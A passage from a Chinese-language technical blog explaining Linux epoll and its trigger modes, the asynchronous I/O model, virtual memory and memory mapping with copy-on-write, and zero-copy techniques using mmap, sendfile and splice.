<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">int epoll_create(int size);</span><br><span class="line">int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；</span><br><span class="line">int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);</span><br><span class="line"></span><br><span class="line"><span class="comment">// epoll_wait检查是否有事件发生时，只需要检查 eventpoll 对象中的 rdlist 双链表中是否有 epitem 元素即可</span></span><br><span class="line">struct eventpoll &#123;</span><br><span class="line">    <span class="comment">/*红黑树的根节点，这颗树中存储着所有添加到epoll中的需要监控的事件*/</span></span><br><span class="line">    struct rb_root  rbr;</span><br><span class="line">    <span class="comment">/*双链表中则存放着将要通过epoll_wait返回给用户的满足条件的事件*/</span></span><br><span class="line">    struct list_head rdlist;</span><br><span class="line">&#125;;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><code>epoll_create</code> 是创建一个 <code>epoll</code>句柄；</li>
<li><code>epoll_ctl</code>是注册要监听的事件类型,用于向内核注册新的描述符或者是改变某个文件描述符的状态；</li>
<li><code>epoll_wait</code>则是等待事件的产生,已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用<code>epoll_wait()</code>便可以得到事件完成的描述符。</li>
</ul>
<p>对于 select 第一个缺点（每次调用select，都需要把 fd 集合从用户态拷贝到内核态），epoll的解决方案在 <code>epoll_ctl</code> 函数中。每次注册新的事件到 epoll 句柄中时（在 <code>epoll_ctl</code> 中指定 <code>EPOLL_CTL_ADD</code>），会把所有的 fd 拷贝进内核，而不是在 <code>epoll_wait</code> 的时候重复拷贝。epoll 保证了每个 fd 在整个过程中只会拷贝一次。</p>
<p>对于第二个缺点（每次调用 select 都需要在内核遍历传递进来的所有 fd），epoll 的解决方案不像 select 或 poll 一样每次都把 current 轮流加入 fd 对应的设备等待队列中，而只在 <code>epoll_ctl</code> 时把 <code>current</code> 挂一遍（这一遍必不可少）并为每个 fd 指定一个回调函数，当设备就绪，唤醒等待队列上的等待者时，就会调用这个回调函数，而这个回调函数会把就绪的 fd 加入一个就绪链表。<code>epoll_wait</code> 的工作实际上就是在这个就绪链表中查看有没有就绪的 fd（利用 <code>schedule_timeout()</code> 实现睡一会，判断一会的效果，和 select 实现中的第7步是类似的）。</p>
<p>对于第三个缺点，epoll 没有这个限制，它所支持的 FD 上限是最大可以打开文件的数目，这个数字一般远大于 2048,举个例子,在1GB 内存的机器上大约是10万左右，具体数目可以 <code>cat /proc/sys/fs/file-max</code> 察看,一般来说这个数目和系统内存关系很大。</p>
<p>从上面的描述可以看出,<code>epoll</code>只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。</p>
<p><code>epoll</code>仅适用于 Linux OS。</p>
<p><code>epoll</code>比<code>select</code>和<code>poll</code>更加灵活而且没有描述符数量限制。</p>
<p><code>epoll</code>对多线程编程更有友好，一个线程调用了<code>epoll_wait()</code>另一个线程关闭了同一个描述符也不会产生像<code>select</code>和<code>poll</code>的不确定情况。</p>
<h5 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h5><p><code>epoll</code>的描述符事件有两种触发模式：<code>LT（level trigger）</code>和<code>ET（edge trigger）</code>。</p>
<ol>
<li><strong>LT</strong> 模式:当<code>epoll_wait()</code>检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用<code>epoll_wait()</code>会再次通知进程。是默认的一种模式，并且同时支持<code>Blocking</code>和<code>No-Blocking</code>。</li>
<li><strong>ET</strong> 模式:和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用<code>epoll_wait()</code>时不会再得到事件到达的通知。<br>很大程度上减少了<code>epoll</code>事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。</li>
</ol>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>很容易产生一种错觉认为只要用<code>epoll</code>就可以了，<code>select</code>和<code>poll</code>都已经过时了，其实它们都有各自的使用场景。</p>
<ol>
<li><code>select</code>应用场景</li>
</ol>
<ul>
<li><code>select</code>的<code>timeout</code>参数精度为微秒，而<code>poll</code>和<code>epoll</code>为毫秒，因此<code>select</code>更加适用于实时性要求比较高的场景，比如核反应堆的控制。</li>
<li><code>select</code>可移植性更好，几乎被所有主流平台所支持。</li>
</ul>
<ol>
<li><code>poll</code>应用场景<br><code>poll</code>没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用<code>poll</code>而不是<code>select</code>。</li>
<li><code>epoll</code>应用场景</li>
</ol>
<ul>
<li>只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。</li>
<li>需要同时监控小于 1000 个描述符，就没有必要使用<code>epoll</code>，因为这个应用场景下并不能体现<code>epoll</code>的优势。</li>
<li>需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用<code>epoll</code>。因为<code>epoll</code>中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过<code>epoll_ctl()</code> 进行系统调用，频繁系统调用降低效率。并且<code>epoll</code> 的描述符存储在内核，不容易调试。</li>
</ul>
<blockquote>
<p>上面的四种IO模型，都是同步的IO模型，因为无论以上哪种模型，真正的数据拷贝过程，都是同步进行的。对于信号驱动模型，内核是在数据准备好之后通知进程，然后进程再通过<code>recvfrom</code>操作进行数据拷贝。可以认为数据准备阶段是异步的，但是，数据拷贝操作是同步的，所以整个IO过程也不能认为是异步的。</p>
</blockquote>
<h2 id="异步IO模型"><a href="#异步IO模型" class="headerlink" title="异步IO模型"></a>异步IO模型</h2><p>应用进程把IO请求传给内核后，完全由内核去操作文件拷贝。内核完成相关操作后，会发信号告诉应用进程本次IO已经完成。</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/%E5%BC%82%E6%AD%A5IO%E6%A8%A1%E5%9E%8B.webp"><img src="http://wx-qiniu.xiaoming.net.cn/%E5%BC%82%E6%AD%A5IO%E6%A8%A1%E5%9E%8B.webp" alt="异步IO模型"></a></p>
<p>用户进程发起<code>aio_read</code>操作后，给内核传递描述符、缓冲区指针、缓冲区大小等，告诉内核当整个操作系统操作完成时，如何通知进程，然后就立刻去做其他事情了。当内核收到<code>aio_read</code>后，会立刻返回，然后内核开始等待数据准备，数据准备好以后，直接把数据拷贝到用户控件，然后在通知进程本次IO已经完成。</p>
<p><strong>异步 IO 的异步体现在:内核不用等待数据准备好就立刻返回，所以内核肯定需要在 IO 完成后通知用户应用进程。</strong></p>
<h1 id="34-Linux中的虚拟内存系统"><a href="#34-Linux中的虚拟内存系统" class="headerlink" title="34. Linux中的虚拟内存系统"></a>34. Linux中的虚拟内存系统</h1><p><strong>Linux为每个进程维护了一个单独的虚拟地址空间</strong>。虚拟地址空间分为内核空间与用户空间，用户空间包括代码、数据、堆、共享库以及栈，内核空间包括内核中的代码和数据结构，内核空间的某些区域被映射到所有进程共享的物理页面。<strong>Linux也将一组连续的虚拟页面（大小等于内存总量）映射到相应的一组连续的物理页面，这种做法为内核提供了一种便利的方法来访问物理内存中任何特定的位置。</strong></p>
<p><a href="http://qiniu.xiaoming.net.cn/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F"><img src="http://qiniu.xiaoming.net.cn/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F" alt="Linux中的虚拟内存系统"></a></p>
<p><strong>Linux将虚拟内存组织成一些区域（也称为段）的集合，区域的概念允许虚拟地址空间有间隙。一个区域就是已经存在着的已分配的虚拟内存的连续片（chunk）</strong>。例如，代码段、数据段、堆、共享库段，以及用户栈都属于不同的区域，<strong>每个存在的虚拟页都保存在某个区域中，而不属于任何区域的虚拟页是不存在的，也不能被进程所引用。</strong></p>
<p>内核为系统中的每个进程维护一个单独的任务结构（task_struct）。<strong>任务结构中的元素包含或者指向内核运行该进程所需的所有信息（PID、指向用户栈的指针、可执行目标文件的名字、程序计数器等）。</strong></p>
<p><a href="http://qiniu.xiaoming.net.cn/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F2"><img src="http://qiniu.xiaoming.net.cn/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F2" alt="Linux中的虚拟内存系统2"></a></p>
<ul>
<li>mm_struct：描述了虚拟内存的当前状态。pgd指向一级页表的基址（当内核运行这个进程时，pgd会被存放在CR3控制寄存器，也就是页表基址寄存器中），mmap指向一个vm_area_structs的链表，其中每个vm_area_structs都描述了当前虚拟地址空间的一个区域。</li>
<li>vm_starts：指向这个区域的起始处。</li>
<li>vm_end：指向这个区域的结束处。</li>
<li>vm_prot：描述这个区域内包含的所有页的读写许可权限。</li>
<li>vm_flags：描述这个区域内的页面是与其他进程共享的，还是这个进程私有的以及一些其他信息。</li>
<li>vm_next：指向链表的下一个区域结构。</li>
</ul>
<h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p><strong>Linux通过将一个虚拟内存区域与一个硬盘上的文件关联起来，以初始化这个虚拟内存区域的内容，这个过程称为内存映射（memory mapping）。这种将虚拟内存系统集成到文件系统的方法可以简单而高效地把程序和数据加载到内存中。</strong></p>
<p>一个区域可以映射到一个普通硬盘文件的连续部分，例如一个可执行目标文件。文件区（section）被分成页大小的片，每一片包含一个虚拟页的初始内容。<strong>由于按需页面调度的策略，这些虚拟页面没有实际交换进入物理内存，直到CPU引用的虚拟地址在该区域的范围内</strong>。如果区域比文件区要大，那么就用零来填充这个区域的余下部分。</p>
<p><strong>一个区域也可以映射到一个匿名文件，匿名文件是由内核创建的，包含的全是二进制零</strong>。当CPU第一次引用这样一个区域内的虚拟页面时，内核就在物理内存中找到一个合适的牺牲页面，如果该页面被修改过，就先将它写回到硬盘，之后用二进制零覆盖牺牲页并更新页表，将这个页面标记为已缓存在内存中的。</p>
<p>简单的来说：<strong>普通文件映射就是将一个文件与一块内存建立起映射关系，对该文件进行IO操作可以绕过内核直接在用户态完成（用户态在该虚拟地址区域读写就相当于读写这个文件）。匿名文件映射一般在用户空间需要分配一段内存来存放数据时，由内核创建匿名文件并与内存进行映射，之后用户态就可以通过操作这段虚拟地址来操作内存了。匿名文件映射最熟悉的应用场景就是动态内存分配（malloc()函数）。</strong></p>
<p>Linux很多地方都采用了“懒加载”机制，自然也包括内存映射。不管是普通文件映射还是匿名映射，Linux只会先划分虚拟内存地址。只有当CPU第一次访问该区域内的虚拟地址时，才会真正的与物理内存建立映射关系。</p>
<p><strong>只要虚拟页被初始化了，它就在一个由内核维护的交换文件（swap file）之间换来换去。交换文件又称为交换空间（swap space）或交换区域（swap area）。swap区域不止用于页交换，在物理内存不够的情况下，还会将部分内存数据交换到swap区域（使用硬盘来扩展内存）。</strong></p>
<h3 id="共享对象"><a href="#共享对象" class="headerlink" title="共享对象"></a>共享对象</h3><hr>
<p>虚拟内存系统为每个进程提供了私有的虚拟地址空间，这样可以保证进程之间不会发生错误的读写。但多个进程之间也含有相同的部分，例如每个C程序都使用到了C标准库，如果每个进程都在物理内存中保持这些代码的副本，那会造成很大的内存资源浪费。</p>
<p><strong>内存映射提供了共享对象的机制，来避免内存资源的浪费。一个对象被映射到虚拟内存的一个区域，要么是作为共享对象，要么是作为私有对象的。</strong></p>
<p>如果一个进程将一个共享对象映射到它的虚拟地址空间的一个区域内，那么这个进程对这个区域的任何写操作，对于那些也把这个共享对象映射到它们虚拟内存的其他进程而言，也是可见的。相对的，对一个映射到私有对象的区域的任何写操作，对于其他进程来说是不可见的。一个映射到共享对象的虚拟内存区域叫做共享区域，类似地，也有私有区域。</p>
<p><strong>为了节约内存，私有对象开始的生命周期与共享对象基本上是一致的（在物理内存中只保存私有对象的一份副本），并使用写时复制的技术来应对多个进程的写冲突。</strong></p>
<p><a href="http://qiniu.xiaoming.net.cn/Linux%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1"><img src="http://qiniu.xiaoming.net.cn/Linux%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1" alt="Linux共享对象"></a></p>
<p>只要没有进程试图写它自己的私有区域，那么多个进程就可以继续共享物理内存中私有对象的一个单独副本。然而，只要有一个进程试图对私有区域的某一页面进行写操作，就会触发一个保护异常。在上图中，进程B试图对私有区域的一个页面进行写操作，该操作触发了保护异常。<strong>异常处理程序会在物理内存中创建这个页面的一个新副本，并更新PTE指向这个新的副本，然后恢复这个页的可写权限。</strong></p>
<p>还有一个典型的例子就是<code>fork()</code>函数，该函数用于创建子进程。当<code>fork()</code>函数被当前进程调用时，内核会为新进程创建各种必要的数据结构，并分配给它一个唯一的PID。为了给新进程创建虚拟内存，它复制了当前进程的<code>mm_struct</code>、<code>vm_area_struct</code>和页表的原样副本。并将两个进程的每个页面都标为只读，两个进程中的每个区域都标记为私有区域（写时复制）。</p>
<p>这样，父进程和子进程的虚拟内存空间完全一致，只有当这两个进程中的任一个进行写操作时，再使用写时复制来保证每个进程的虚拟地址空间私有的抽象概念。</p>
<h1 id="35-零拷贝"><a href="#35-零拷贝" class="headerlink" title="35. 零拷贝"></a>35. 零拷贝</h1><p>传统上，网络服务器通过网络将文件中存储的数据提供给客户端的过程是：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">read(file, tmp_buf, len);</span><br><span class="line">write(socket, tmp_buf, len);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>这里其实经历了四次上下文切换：</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9D1.webp"><img src="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9D1.webp" alt="四次上下文切换"></a></p>
<ol>
<li>数据从磁盘读取到内核 read buffer，具体为：读取系统调用导致上下文从用户模式切换到内核模式。第一个副本由DMA引擎执行，该引擎从磁盘读取文件内容并将其存储到内核地址空间缓冲区中。</li>
<li>数据从内核缓冲区拷贝到用户缓冲区，然后读取系统调用返回，调用返回导致上下文从内核切换回用户模式。</li>
<li>数据从用户缓冲区拷贝到内核的 socket buffer，写系统调用导致上下文从用户模式又切换到内核模式。</li>
<li>数据从内核的 socket buffer 拷贝到网卡接口（硬件）的缓冲区，这一步也是通过 DMA 来传输。</li>
</ol>
<p>从上面的步骤来说，第2、3步是不必要的。在此过程中，没有对文件内容做任何修改，那么在内核空间和用户空间来回拷贝数据无疑就是一种浪费，另外多次上下文的切换也影响性能。而零拷贝主要就是为了解决这种低效性。</p>
<p>零拷贝主要的任务就是避免 CPU 将数据从一块存储拷贝到另外一块存储，主要就是利用各种零拷贝技术，避免让CPU做大量的数据拷贝任务，减少不必要的拷贝，或者让别的组件来做这一类简单的数据传输任务，让CPU解脱出来专注于别的任务。这样就可以让系统资源的利用更加有效。这里主要有几个方法：</p>
<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p>应用程序调用<code>mmap()</code>，磁盘上的数据会通过<code>DMA</code>被拷贝的内核缓冲区，接着操作系统会把这段内核缓冲区与应用程序共享，这样就不需要把内核缓冲区的内容往用户空间拷贝。应用程序再调用<code>write()</code>,操作系统直接将内核缓冲区的内容拷贝到<code>socket</code>缓冲区中，这一切都发生在内核态，最后，<code>socket</code>缓冲区再把数据发到网卡去。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tmp_buf = mmap(file, len);</span><br><span class="line">write(socket, tmp_buf, len);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p><a href="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dmmap.webp"><img src="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dmmap.webp" alt="mmap"></a></p>
<p>使用 mmap 替代 read 很明显减少了一次拷贝，当拷贝数据量很大时，无疑提升了效率。但是使用 <code>mmap</code> 是有代价的。当使用 <code>mmap</code> 时，可能会遇到一些隐藏的陷阱。例如，当程序 <code>map</code> 了一个文件，但是当这个文件被另一个进程截断(truncate)时, write 系统调用会因为访问非法地址而被 <code>SIGBUS</code> 信号终止。<code>SIGBUS</code> 信号默认会杀死你的进程并产生一个 <code>coredump</code>,如果服务器这样被中止了，那会产生一笔损失。</p>
<p>通常使用以下解决方案避免这种问题：</p>
<ol>
<li><strong>为SIGBUS信号建立信号处理程序</strong><br>当遇到<code>SIGBUS</code>信号时，信号处理程序简单地返回，<code>write</code>系统调用在被中断之前会返回已经写入的字节数，并且<code>errno</code>会被设置成success,但是这是一种糟糕的处理办法，因为并没有解决问题的实质核心。这是一个治标不治本的解决方案。因为收到 <code>SIGBUS</code> 信号表示程序发生了严重的错误，不推荐使用它作为解决方案。</li>
<li><strong>使用文件租借锁</strong><br>通常使用这种方法，在文件描述符上使用租借锁，为文件向内核申请一个租借锁，当其它进程想要截断这个文件时，内核会向我们发送一个实时的<code>RT_SIGNAL_LEASE</code>信号，告诉我们内核正在破坏你加持在文件上的读写锁。这样在程序访问非法内存并且被<code>SIGBUS</code>杀死之前，你的<code>write</code>系统调用会被中断。<code>write</code>会返回已经写入的字节数，并且置<code>errno</code>为success。</li>
</ol>
<h2 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h2><p>从2.1版内核开始，Linux引入了<code>sendfile</code>来简化操作:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#include&lt;sys/sendfile.h&gt;</span><br><span class="line">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>系统调用 <code>sendfile()</code> 在代表输入文件的描述符 <code>in_fd</code> 和代表输出文件的描述符 <code>out_fd</code> 之间传送文件内容（字节）。描述符 <code>out_fd</code> 必须指向一个套接字，而 <code>in_fd</code> 指向的文件必须是可以 <code>mmap</code> 的。这些局限限制了 <code>sendfile</code> 的使用，<strong>使 <code>sendfile</code> 只能将数据从文件传递到套接字上，反之则不行。</strong></p>
<p>使用 <code>sendfile</code> 不仅减少了数据拷贝的次数，还减少了上下文切换，数据传送始终只发生在 <code>kernel space</code>。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dsendfile.webp"><img src="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dsendfile.webp" alt="sendfile"></a></p>
<p>在调用<code>sendfile</code>时，如果有其它进程截断了文件，假设没有设置任何信号处理程序，<code>sendfile</code>调用仅仅返回它在被中断之前已经传输的字节数，<code>errno</code> 会被置为success。如果在调用 sendfile 之前给文件加了锁，<code>sendfile</code> 的行为仍然和之前相同，还会收到 <code>RT_SIGNAL_LEASE</code>的信号。</p>
<p>目前为止，仍然存在一次拷贝，就是页缓存到socket缓存的拷贝。</p>
<p>借助于硬件上的帮助，可以将这一次的拷贝也省略。之前是把页缓存的数据拷贝到 socket 缓存中，实际上，我们仅仅需要把缓冲区描述符传到 <code>socket</code> 缓冲区，再把数据长度传过去，这样 <code>DMA</code> 控制器直接将页缓存中的数据打包发送到网络中就可以了。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dsendfile2.webp"><img src="http://qiniu.xiaoming.net.cn/%E9%9B%B6%E6%8B%B7%E8%B4%9Dsendfile2.webp" alt="sendfile2"></a></p>
<p>总结一下，<code>sendfile</code> 系统调用利用 <code>DMA</code> 引擎将文件内容拷贝到内核缓冲区去，然后将带有文件位置和长度信息的缓冲区描述符添加 socket 缓冲区去，这一步不会将内核中的数据拷贝到 socket 缓冲区中，<code>DMA</code>引擎会将内核缓冲区的数据拷贝到协议引擎中去，避免了最后一次拷贝。不过这一种收集拷贝功能是需要硬件以及驱动程序支持的。</p>
<h2 id="使用splice"><a href="#使用splice" class="headerlink" title="使用splice"></a>使用splice</h2><p>sendfile 只适用于将数据从文件拷贝到套接字上，限定了它的使用范围。Linux在<code>2.6.17</code>版本引入<code>splice</code>系统调用，用于在两个文件描述符中移动数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>splice 调用在两个文件描述符之间移动数据，而不需要数据在内核空间和用户空间来回拷贝。他从 <code>fd_in</code> 拷贝 <code>len</code> 长度的数据到 <code>fd_out</code>，但是有一方必须是管道设备，这也是目前 <code>splice</code> 的一些局限性。<code>flags</code>参数有以下几种取值：</p>
<ul>
<li><strong>SPLICE_F_MOVE</strong> ：尝试去移动数据而不是拷贝数据。这仅仅是对内核的一个小提示：如果内核不能从<code>pipe</code>移动数据或者<code>pipe</code>的缓存不是一个整页面，仍然需要拷贝数据。Linux最初的实现有些问题，所以从<code>2.6.21</code>开始这个选项不起作用，后面的Linux版本应该会实现。</li>
<li><strong>SPLICE_F_NONBLOCK</strong> ：<code>splice</code> 操作不会被阻塞。然而，如果文件描述符没有被设置为不可被阻塞方式的 I/O ，那么调用 splice 有可能仍然被阻塞。</li>
<li><strong>SPLICE_F_MORE</strong>： 后面的 <code>splice</code> 调用会有更多的数据。</li>
</ul>
<p>splice 调用利用了 Linux 提出的管道缓冲区机制， 所以至少一个描述符要为管道。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
